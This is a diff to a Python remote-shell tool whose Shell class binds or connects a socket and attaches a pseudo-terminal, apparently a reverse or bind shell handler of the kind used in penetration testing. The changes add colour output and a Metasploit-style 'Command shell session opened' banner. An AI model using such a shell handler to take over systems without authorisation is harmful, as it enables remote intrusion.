@@ -7,6 +7,10 @@ import ast
 import fcntl
 import argparse
 
+from colored import *
+from colorama import *
+from time import gmtime, strftime
+
 class PTY:
     def __init__(self, slave=0, pid=os.getpid()):
         # apparently python GC's modules before class instances so, here
@@ -67,7 +71,16 @@ class Shell:
             self.sock.bind(self.addr)
             self.sock.listen(5)
 
+    def find_between(self, st,first,last):
+        try:
+            start = st.index(first)+len(first)
+            end = st.index(last,start)
+            return st[start:end]
+        except ValueError:
+            return ""
+
     def handle(self, addr=None):
+        global HOST1,PORT1
         addr = addr or self.addr
         if self.bind:
             sock, addr = self.sock.accept()
@@ -76,6 +89,7 @@ class Shell:
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             sock.connect(addr)
 
+        print (fore.DODGER_BLUE_2 + style.BOLD +  "[*] "+ style.RESET + "Command shell session opened (%s:%s -> %s:%s) at %s \n" % ( HOST1,PORT1,str(self.find_between(str(addr), "'", "'")), str(self.find_between(str(addr), ", ", ")")), strftime("%Y-%m-%d %H:%M:%S", gmtime())   )  )
         # create our PTY
         pty = PTY()
 
@@ -122,9 +136,12 @@ class Shell:
 
         # close the socket
         sock.close()
-
+        
 def run(host,port):
+    global HOST1,PORT1
 
+    HOST1 = host
+    PORT1 = port
     address = "('%s',%s)" % (host,int(port))
     address = ast.literal_eval(address)
 
